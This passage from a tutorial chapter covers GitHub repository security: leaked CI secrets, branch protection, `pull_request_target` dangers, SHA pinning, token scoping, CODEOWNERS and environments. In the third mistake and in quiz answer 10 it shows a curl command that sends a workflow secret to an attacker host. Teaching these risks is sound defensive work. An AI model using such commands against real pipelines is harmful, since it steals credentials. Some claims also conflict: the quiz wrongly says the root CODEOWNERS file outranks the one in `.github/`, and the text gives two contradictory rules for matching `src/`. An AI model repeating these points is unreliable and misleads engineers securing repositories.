**Root Cause:** Developers confuse "it's in a private repo" with "it's secure." But:
- Any repo collaborator can read this file
- If the repo ever becomes public (common during acquisitions or mistakes), the key is exposed
- The key is baked into git history — even if you delete the line, `git log -p` or `git reflog` reveals it
- GitHub secret scanning bots run on ALL public repos and many private ones

**Fix:**
```bash
# IMMEDIATE RESPONSE:
# 1. Revoke the exposed credential RIGHT NOW (before anything else)
#    Go to Stripe dashboard → API Keys → Delete the key

# 2. Remove from git history using git filter-repo (see Topic 26)
pip install git-filter-repo
git filter-repo --path .github/workflows/deploy.yml --invert-paths
# OR targeted string replacement:
git filter-repo --replace-text <(echo 'sk_live_AbCdEfGhIjKlMnOpQrStUvWx==>***REMOVED***')

# 3. Force push (coordinate with team first)
git push origin --force --all
git push origin --force --tags

# 4. Re-add the secret properly via GitHub UI or CLI
gh secret set STRIPE_SECRET_KEY --body "sk_live_NewKeyGoesHere"
```

**New correct workflow:**
```yaml
# ✅ CORRECT — secret injected at runtime, never stored in files
steps:
  - run: |
      curl -X POST https://api.stripe.com/v1/charges \
        -u "$STRIPE_SECRET_KEY:"
    env:
      STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
```

**Prevention:**
- Enable GitHub's secret scanning on all repos (Settings → Code security → Secret scanning)
- Install `git-secrets` as a pre-commit hook: `git secrets --install`
- Add `.env` to `.gitignore` and use `.env.example` for documentation
- Audit with `git log -p | grep -E "(sk_live|password|secret|key)"` regularly

---

### MISTAKE 2: Branch Protection Not Applied to Admins

**The mistake:**
```
Branch Protection Rule:
  enforce_admins: false    ← DEFAULT — admins bypass all rules
```

**Root Cause:** "I'm the admin, I sometimes need to hotfix production." This leads to:
- Admins bypassing CI checks during a crisis
- Breaking the build for the rest of the team
- Audit trail shows "admin pushed directly to main" which looks bad to auditors
- One person's emergency becomes team-wide broken deployment

**Fix:**
```
Option A: Enable enforce_admins: true
  Pro: Consistent rules
  Con: Even emergencies require a PR

Option B: Use "bypass list" in Repository Rulesets (newer feature)
  - Creates an allow-list of specific people/teams/apps who can bypass
  - These bypasses are LOGGED (visible in push audit log)
  - Compromise: emergency bypasses are possible but auditable

Option C: Separate hotfix workflow
  - Create a hotfix/* branch that can push directly to main
  - But CI still runs; only PR requirement is bypassed
  - Restrict this branch to senior engineers
```

**Prevention:**
- Enable: Settings → Branches → Require rules for administrators
- Review the audit log (Settings → Audit log) monthly to see who bypassed what
- Add a CODEOWNERS entry for deployment-sensitive files so bypasses still need approval

---

### MISTAKE 3: Using `pull_request` Trigger with Fork PRs — Secret Exposure

**The mistake:**
```yaml
# ❌ DANGEROUS PATTERN
on:
  pull_request_target:     # ← runs in context of BASE repo, not fork
    types: [opened, synchronize]
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out FORK's code
      - run: npm test
        env:
          SECRET: ${{ secrets.MY_SECRET }}    # ← SECRET IS EXPOSED TO FORK'S CODE
```

**Root Cause:** `pull_request_target` runs with full repo permissions and secrets, in the context of the base repo. If you also check out the fork's code, you're running untrusted code with access to your secrets. An attacker can:
1. Fork your repo
2. Modify the test script to `curl https://attacker.com?secret=$SECRET`
3. Open a PR

**The safe alternatives:**
```yaml
# ✅ OPTION A: use "pull_request" (not target) — no secrets for fork PRs
on:
  pull_request:            # ← runs fork's code, but NO secrets injected from target repo
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
      - run: npm test      # ← safe: no secrets available here for fork PRs

# ✅ OPTION B: Two-workflow pattern (if you must use secrets)
# Workflow 1: runs on pull_request (no secrets), uploads artifacts
# Workflow 2: runs on workflow_run (triggered when workflow 1 completes)
#             uses secrets, downloads trusted artifacts from workflow 1
#             NEVER checks out the PR code
```

**Prevention:**
- Default: use `pull_request` (not `pull_request_target`)
- Only use `pull_request_target` if you NEVER check out PR code AND have read the security docs
- Enable "Required approval for all outside collaborators" in Actions settings

---

### MISTAKE 4: Pinning Actions to Mutable Tags

**The mistake:**
```yaml
# ❌ RISKY — tag v4 can be moved to point to new (potentially malicious) code
uses: actions/checkout@v4
uses: some-org/dangerous-action@main  # ← even worse: main moves all the time
```

**Root Cause:** Tags in git are mutable (they can be force-pushed to a new SHA). If the `actions/checkout` repo was compromised and the `v4` tag was moved to malicious code, your workflow would run it.

**Fix:**
```yaml
# ✅ SECURE — pin to the full SHA (immutable — SHAs cannot be changed)
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0

# Most repos add the version as a comment so humans can track it:
# uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

**Tool to auto-generate pinned versions:**
```bash
# pin-github-action can auto-resolve tags to SHAs
npx pin-github-action .github/workflows/ci.yml

# Dependabot for GitHub Actions (configured in dependabot.yml)
# will submit PRs to update pinned SHAs when new versions release
```

**Prevention:**
- Use Dependabot to watch `github-actions` ecosystem for updates
- For internal actions (your own org), mutable tags are lower risk but still pin for prod workflows
- Use StepSecurity's Harden-Runner action to restrict which network calls actions can make

---

### MISTAKE 5: Not Scoping GITHUB_TOKEN Permissions

**The mistake:**
```yaml
# ❌ OVERLY BROAD — default permissions grant write access to many resources
jobs:
  build:
    runs-on: ubuntu-22.04
    # No "permissions:" block → uses repo-level defaults (often write to everything)
    steps:
      - run: npm build
```

**Root Cause:** If a build step downloads a malicious npm package, that package could use the `GITHUB_TOKEN` environment variable to push code, create releases, or modify issues — all within your repo.

**Fix:**
```yaml
# ✅ PRINCIPLE OF LEAST PRIVILEGE
permissions:
  contents: read   # ← only what we actually need (clone the repo)
jobs:
  build:
    permissions:   # ← job-level overrides workflow-level
      contents: read
      checks: write   # ← if this job reports check results

# For workflows that need NO GitHub API access:
permissions: {}    # ← completely empty = no permissions
```

**Configure org-wide defaults:**
```
GitHub Settings → Actions → General → Workflow permissions
→ "Read repository contents and packages permissions"  ← set as default
→ Individual workflows can opt-in to write when needed
```

---

## RULE 9 — Byte-Level Internals

### How GitHub Encrypts Secrets

GitHub uses [libsodium](https://libsodium.gitbook.io/) sealed boxes for secret storage:

```
SECRET ENCRYPTION FLOW:

1. User submits secret value via UI or API
   Input: "sk_live_AbCdEfGhIjKlMn"

2. Client-side encryption (happens in your browser / gh CLI):
   ├── GitHub API returns the repository's PUBLIC KEY (base64-encoded)
   │   GET /repos/{owner}/{repo}/actions/secrets/public-key
   │   Response: { "key_id": "012345678", "key": "base64encodedpublickey==" }
   ├── Client decodes the public key
   ├── Client encrypts the secret using libsodium sealed box:
   │   sealed_box = crypto_box_seal(secret_value, repo_public_key)
   └── Client sends the ENCRYPTED value to GitHub API
       PUT /repos/{owner}/{repo}/actions/secrets/MY_SECRET
       Body: { "encrypted_value": "base64(sealed_box)", "key_id": "012345678" }

3. GitHub stores only the encrypted value
   ├── The plaintext NEVER travels over the wire (after initial API call)
   ├── The private key is held by GitHub's HSM (Hardware Security Module)
   └── GitHub cannot read your secrets without the HSM's private key

4. At workflow runtime:
   ├── Runner requests the secret via internal API (over mTLS)
   ├── GitHub decrypts using the HSM private key
   ├── Plaintext is sent to runner over encrypted channel (in-memory only)
   └── Runner sets it as an environment variable, never writes to disk

5. Log masking:
   ├── GitHub maintains a list of secret values for this run
   ├── Before writing any log line, it checks if the line contains any secret value
   └── Matches are replaced with "***"
   
IMPORTANT: If a secret appears base64-encoded in a log, it is NOT masked.
This is a known limitation. Never decode secrets in run steps.
```

### How Branch Protection Checks Work Internally

```
GitHub's "check run" system (the Checks API):

1. Any CI system (GitHub Actions, CircleCI, Jenkins, etc.) can create a "check run"
   by calling: POST /repos/{owner}/{repo}/check-runs
   {
     "name": "ci/tests",
     "head_sha": "abc123...",
     "status": "in_progress",
     "started_at": "2026-05-28T10:00:00Z"
   }

2. As CI progresses, it updates the check run:
   PATCH /repos/{owner}/{repo}/check-runs/42
   {
     "status": "completed",
     "conclusion": "success",   ← or "failure", "cancelled", "skipped"
     "completed_at": "2026-05-28T10:03:45Z",
     "output": {
       "title": "All 142 tests passed",
       "summary": "Coverage: 87%"
     }
   }

3. Branch protection evaluates the required check names against:
   ├── All check runs for this HEAD SHA
   ├── Looks up required check contexts by name
   └── If ALL required checks are "completed" with "success" → gate passes

4. The "name" in the check run is what you add to:
   Settings → Branches → Require status checks → search for check name

GITHUB ACTIONS SPECIFIC:
   Job name in workflow → becomes the check run name
   "CI / Build & Test (20)" is:  workflow_name / job_name (matrix_values)
   You MUST add this EXACT string to required checks, including the matrix variant
```

### CODEOWNERS: How GitHub Parses the File

```
CODEOWNERS is a text file with these parse rules:

1. File encoding: UTF-8
2. Line endings: Unix (\n) or Windows (\r\n), both work
3. Comments: lines starting with # are ignored
4. Blank lines: ignored
5. Pattern matching: uses the same algorithm as .gitignore
   └── But with one critical difference:
       .gitignore: first matching rule wins
       CODEOWNERS: LAST matching rule wins

Example resolution trace:
─────────────────────────────
File: src/billing/invoice.ts

CODEOWNERS:
  *                    @all                 ← MATCH (line 1)
  *.ts                 @ts-team             ← MATCH (line 2)
  src/                 @backend             ← MATCH (line 3)
  src/billing/         @billing-team        ← MATCH (line 4) ← WINS

Result: @billing-team is assigned as required reviewer
─────────────────────────────

6. Pattern expansion:
   Pattern "src/"  → anchored to root: matches /src/ and all contents
   Pattern "*.ts"  → matches in any directory (same as gitignore)
   Pattern "/docs/" → leading slash anchors to root only

7. Team membership resolution:
   @org/team-name → GitHub expands this to all current members of the team
   If a team member is already a contributor to the PR, they still appear
   as a required reviewer (self-review is usually blocked by branch protection)
```

---

## RULE 10 — Mental Model Checkpoint

Can you answer all 10 of these from memory? If not, re-read the relevant section.

**1.** You push directly to `main` and get a "protected branch" error. The push is rejected *before* any objects are written to the remote. True or false?

**2.** CODEOWNERS is in `.github/CODEOWNERS`. There's also a `CODEOWNERS` at the repo root. Which one does GitHub use?

**3.** Your workflow has `on: pull_request`. A fork submits a PR. Do the workflow's `${{ secrets.MY_SECRET }}` get injected into the fork PR's run?

**4.** A required status check is called `CI / test` in branch protection settings. Your workflow has `name: CI` and `jobs: tests:`. Why doesn't the check appear?

**5.** You want job B to run only if job A succeeds. Job A produces a Docker image tag as output. How do you pass this tag from job A to job B?

**6.** A secret is stored at repo level AND at environment level, both named `DATABASE_URL`. Your job uses `environment: staging`. Which value is injected?

**7.** You have `enforce_admins: false` in branch protection. Your CTO (who is an org admin) pushes directly to `main` with `git push --force`. What happens?

**8.** A developer sets `permissions: write-all` in their workflow. Is this more or less risky than the default? What's the correct approach?

**9.** You need to deploy to AWS without storing `AWS_ACCESS_KEY_ID` as a secret. What technology makes this possible and how does it work at a high level?

**10.** You have a `pull_request_target` workflow that checks out `${{ github.event.pull_request.head.sha }}`. A malicious fork opens a PR. What can the attacker do?

---

**Answers:**

1. **True.** The protection check happens in `receive-pack` before any ref is updated. The pack data is rejected entirely.

2. **The root `CODEOWNERS`** wins — GitHub checks `/CODEOWNERS` first, then `/.github/CODEOWNERS`, then `/docs/CODEOWNERS`. First found wins.

3. **No.** For `pull_request` events from forks, secrets are NOT injected (empty strings). This is a security boundary. Use `pull_request_target` only with extreme caution.

4. The check name GitHub records is `"{workflow name} / {job name}"`. Your workflow is `CI` and your job is `tests`, so the check name is `"CI / tests"` — but you said the job is `tests` not `test`. Exact string match required. Also matrix jobs include the matrix values: `"CI / tests (20)"`.

5. Use job outputs:
   ```yaml
   jobs:
     A:
       outputs:
         image-tag: ${{ steps.build.outputs.tag }}
     B:
       needs: A
       steps:
         - run: echo ${{ needs.A.outputs.image-tag }}
   ```

6. **Environment secret wins.** Priority: Environment > Repository > Organization.

7. The force push **succeeds** (admin bypasses rules because `enforce_admins: false`). The branch history is rewritten. This is why `enforce_admins: true` is recommended for `main`.

8. **More risky.** `write-all` grants maximum permissions. An attacker who compromises a workflow step (e.g., via malicious dependency) gets write access to your entire repo, packages, issues, etc. Use `permissions: read-all` as baseline and grant specific writes per-job.

9. **OIDC (OpenID Connect).** GitHub generates a JWT for the workflow run. AWS is configured to trust GitHub's OIDC provider. The `aws-actions/configure-aws-credentials` action exchanges the JWT for temporary AWS credentials using `AssumeRoleWithWebIdentity`. No long-lived keys stored anywhere.

10. The attacker's fork code runs in the context of the **base repository** with full access to `secrets.*`. They can exfiltrate all secrets (e.g., `curl https://attacker.com?s=$MY_SECRET`).

---

## RULE 11 — Connect Everything Backwards

**→ Topic 19 (Git Hooks):** Client-side hooks enforce quality locally; GitHub Actions and branch protection enforce quality *server-side*. They are complementary. A pre-commit hook can be bypassed with `git commit --no-verify`; branch protection cannot be bypassed from the client side (only admin bypass from GitHub UI, which is audited). CODEOWNERS is the server-side version of assigning reviewers that you'd otherwise have to do manually.

**→ Topic 16 (Pull Requests):** Branch protection rules are the *enforcement mechanism* behind PR best practices. Topic 16 described the social contract; Topic 24 is how you bake that contract into the repository so it can't be skipped, even by accident.

**→ Topic 15 (Git Workflows):** Trunk-based development *requires* strong branch protection on `main` + fast CI. GitHub Actions is the CI/CD backbone that makes trunk-based viable — developers can merge confidently because automated checks run on every PR. The `deploy-staging` job in the production example is exactly the continuous delivery step of trunk-based.

**→ Topic 10 (Remotes):** `git push` to a protected branch triggers GitHub's `receive-pack` hook, which evaluates protection rules. The rejection you see in `git push` output is GitHub's server-side receive-pack responding with error codes. Remote refs like `refs/pull/42/merge` are GitHub-specific synthetic refs created for the PR workflow.

**→ Topic 07 (Commits Done Right):** Conventional Commits from Topic 07 pair with GitHub Actions: a `chore(deps):` commit from Dependabot follows the Conventional Commits format, and your CI can automatically classify it and skip certain checks. The `release-please` GitHub Action can auto-create releases based on Conventional Commit history.

**→ Topic 02 (Git Objects):** The `head_sha` you see throughout the GitHub API is a 40-character commit SHA — the exact same commit object we dissected in Topic 02. When GitHub creates a synthetic merge commit (`refs/pull/42/merge`), it's a real commit object with a tree object pointing to the merged state.

**→ Topic 14 (Tags & Releases):** The `if: startsWith(github.ref, 'refs/tags/v')` condition in the production deploy job is triggered by `git tag v1.2.3 && git push --tags` — the exact tag operations from Topic 14. GitHub Releases are a UI layer on top of git tags, and the `workflow_dispatch` trigger with a version input is the alternative for teams that don't use tagged releases.

---

## RULE 12 — Quick Reference Card

### Branch Protection

| Setting | API Field | What It Does |
|---|---|---|
| Require PR before merging | `required_pull_request_reviews` | No direct pushes to branch |
| Required approving reviews | `required_approving_review_count` | N approvals needed |
| Dismiss stale reviews | `dismiss_stale_reviews` | New commits reset approvals |
| Require code owner review | `require_code_owner_reviews` | CODEOWNERS must approve |
| Require status checks | `required_status_checks` | Named CI checks must pass |
| Require up-to-date branch | `strict` in status checks | Branch must be at base HEAD |
| Apply to admins | `enforce_admins` | Rules apply to everyone |
| Block force push | `allow_force_pushes: false` | Prevents history rewrite |
| Block deletion | `allow_deletions: false` | Can't delete the branch |

### CODEOWNERS Patterns

| Pattern | Matches |
|---|---|
| `*` | Every file (catch-all) |
| `*.js` | All `.js` files anywhere |
| `/docs/` | Only `/docs/` (root-anchored) |
| `src/` | Any `src/` directory anywhere |
| `**/*.test.ts` | `.test.ts` files at any depth |
| `apps/*/src/` | `apps/<one-segment>/src/` |

### GitHub Actions Key Commands

| Task | YAML Key |
|---|---|
| Trigger on push | `on: push` |
| Trigger on PR | `on: pull_request` |
| Manual trigger | `on: workflow_dispatch` |
| Scheduled | `on: schedule: - cron: '...'` |
| Job dependency | `needs: [job-a, job-b]` |
| Conditional step | `if: github.ref == 'refs/heads/main'` |
| Use pre-built action | `uses: actions/checkout@v4` |
| Run shell command | `run: npm test` |
| Reference secret | `${{ secrets.MY_SECRET }}` |
| Reference env var | `${{ env.MY_VAR }}` |
| Job output | `outputs: key: ${{ steps.id.outputs.key }}` |
| Matrix strategy | `strategy: matrix: node: [18, 20]` |
| Environment gate | `environment: production` |
| Reusable workflow | `uses: org/repo/.github/workflows/file.yml@ref` |

### GitHub CLI (gh) Cheatsheet

```bash
gh run list                              # list recent workflow runs
gh run view <run-id>                     # run details
gh run watch <run-id>                    # live tail
gh run rerun <run-id>                    # re-run
gh workflow run <workflow-file> [--field key=value]  # manual trigger
gh secret list                           # list secret names
gh secret set NAME --body "value"        # create/update secret
gh secret delete NAME                    # delete secret
gh api repos/{owner}/{repo}/branches/main/protection  # view protection rules
```

### Contexts at a Glance

| Context | Example Key | Example Value |
|---|---|---|
| `github` | `github.sha` | `abc123def456...` (40 chars) |
| `github` | `github.ref` | `refs/heads/main` |
| `github` | `github.actor` | `alice` |
| `github` | `github.event_name` | `push` |
| `env` | `env.NODE_VERSION` | `20` |
| `secrets` | `secrets.MY_SECRET` | `(masked)` |
| `needs` | `needs.build.outputs.tag` | `sha-abc123` |
| `matrix` | `matrix.node` | `20` |
| `inputs` | `inputs.environment` | `staging` |
| `runner` | `runner.os` | `Linux` |

---

## RULE 13 — When Would I Use This At Work?

### Scenario 1: New Engineer Accidentally Pushes to `main`

```
Week 1 at a new job. Sarah clones the backend repo, makes a fix, 
and runs git push origin main. Immediately gets:

  remote: error: GH006: Protected branch update failed for refs/heads/main.
  remote: error: Required pull request reviews must be made on this branch.

What Sarah does:
  git checkout -b fix/null-pointer-sarah
  git push origin fix/null-pointer-sarah
  gh pr create --title "fix: handle null pointer in user lookup" --body "..."
  # → 2 reviewers auto-assigned by CODEOWNERS
  # → CI runs automatically
  # → Merge button available after approval + CI green

This is the system WORKING. The friction is intentional.
```

### Scenario 2: Emergency Hotfix at 2AM

```
Production is down. Memory leak in the auth service. You need to push NOW.

WITH enforce_admins: true (best practice):
  1. git checkout -b hotfix/auth-memleak
  2. git commit -m "fix: patch memory leak in token refresh loop"  
  3. git push origin hotfix/auth-memleak
  4. gh pr create --title "HOTFIX: auth memory leak" --base main
  5. Tag the PR: hotfix, P0
  6. Ping @tech-lead on Slack: "Need emergency review, production down"
  7. Tech lead reviews in 3 minutes
  8. CI runs (2 min), passes
  9. Merge → auto-deploys to production
  10. Total time: ~8 minutes

This is BETTER than bypassing. The review catches that your fix 
has a typo in the variable name before it goes to production.

WITH enforce_admins: false (risky shortcut):
  git push origin main --force-with-lease
  # ← works, but no review, no CI validation, audit log shows bypass
```

### Scenario 3: Auditing Who Changed the CI Configuration

```
Something broke in the deployment pipeline. When did the workflow change?

# CODEOWNERS requires devops team approval for .github/ changes
# So every change has a PR, a reviewer, and an audit trail

git log --oneline .github/workflows/deploy.yml
# shows: all commits that touched this file

gh pr list --search ".github/workflows" --state merged --limit 20
# shows: all PRs that touched workflow files

# If someone bypassed CODEOWNERS (somehow):
gh api repos/{owner}/{repo}/audit-log --field phrase="action:protected_branch.policy_override"
# shows: every branch protection bypass with actor, timestamp, IP
```

### Scenario 4: Onboarding a New Team Member with Zero GitHub Setup

```
DevOps team adds a new service to the org. They need:
- CI that runs on every PR
- Auto-deploy to staging on merge to main
- Manual approve for production
- Dependabot watching npm + Docker

INSTEAD OF configuring this from scratch, they use a workflow template:

1. Create the repo from org's template repository
   (Settings → Template repository)
   Template includes: .github/workflows/, CODEOWNERS, dependabot.yml

2. Update CODEOWNERS to add the new team's owners:
   new-service/    @new-team-lead @my-org/platform-team

3. Add repo to org-level secret (AWS_PROD_ROLE_ARN) access list

4. Set up environment protection rules for "production":
   Required reviewers: @new-team-lead
   
Result: The new service has production-grade CI/CD in under 30 minutes,
consistent with every other service in the org.
```

### Scenario 5: Detecting a Supply Chain Attack

```
SCENARIO: A popular GitHub Action (actions/malicious-uploader@v3) was 
compromised. The attacker moved the v3 tag to malicious code that 
exfiltrates GITHUB_TOKEN.

YOUR POSTURE IF YOU PINNED TO SHA:
  uses: actions/malicious-uploader@a1b2c3d4e5f6...  # v3.1.0

→ You're SAFE. Your workflow still runs the pinned SHA a1b2c3d4e5f6.
  The attacker's tag move doesn't affect you.
  Dependabot will open a PR when v3.2.0 releases with the new SHA,
  at which point you review the changelog and approve the update.

YOUR POSTURE IF YOU USED THE TAG:
  uses: actions/malicious-uploader@v3

→ You're COMPROMISED. Next run picks up the new code at v3.
  The GITHUB_TOKEN for your repo is now in the attacker's hands.
  They can push code to your repo, create releases, read all source.

RESPONSE if compromised:
  1. Immediately: Settings → Actions → Disable Actions (stops all runs)
  2. Rotate secrets: assume all secrets were exfiltrated
  3. Review audit log: what was the GITHUB_TOKEN used to do?
  4. Check git log on main: any unexpected commits?
  5. Re-enable Actions with the action pinned to a safe SHA
```

---

## APPENDIX A — GitHub Repository Rulesets (New API, 2024+)

Repository Rulesets are the next-generation replacement for Branch Protection Rules. 
They support everything branch protection does, plus:

```
RULESETS ADVANTAGES:
├── Layered: org-level rulesets cascade to all repos
├── Bypass list: specific actors can bypass with audit logging
├── Status: can be "evaluate" (log only) or "active" (enforce)
├── Target patterns: match branches by glob (release/*, v*.*)
│   ├── Branch protection: one rule per exact branch name
│   └── Rulesets: one rule for all release/* branches at once
├── Tag protection: rulesets can protect tags too
└── Push rules: block pushes containing secrets, large files, etc.

RULESETS API vs BRANCH PROTECTION API:
  Branch protection: /repos/{owner}/{repo}/branches/{branch}/protection
  Rulesets: /repos/{owner}/{repo}/rulesets
            /orgs/{org}/rulesets
```

---

## APPENDIX B — GitHub Environments in Depth

```yaml
ENVIRONMENTS (Settings → Environments):

production:
  Protection rules:
    Required reviewers: @alice, @carlos         ← manual approval gate
    Wait timer: 5 minutes                       ← automatic delay (rollback window)
    Deployment branches and tags: main, v*.*.*  ← only these refs can deploy here

  Secrets:
    DATABASE_URL: postgresql://prod-db:5432/...
    STRIPE_LIVE_KEY: sk_live_...

  Variables (non-secret, visible in logs):
    APP_VERSION: "2.1.0"
    LOG_LEVEL: "warn"

DEPLOYMENT FLOW WITH ENVIRONMENTS:
  1. Job reaches environment: production
  2. GitHub creates a "deployment" record for this SHA
  3. If required reviewers configured:
     → Workflow pauses
     → GitHub sends notification to required reviewers
     → Reviewers see: PR description, SHA, test results
     → Reviewer clicks "Approve" in GitHub UI or via API
  4. Wait timer counts down (if configured)
  5. Job resumes, environment secrets injected
  6. Job completes → deployment status updated (success/failure)
  7. GitHub deploys page shows deployment history per environment
```

---

*Topic 24 complete — 24/26 topics done.*
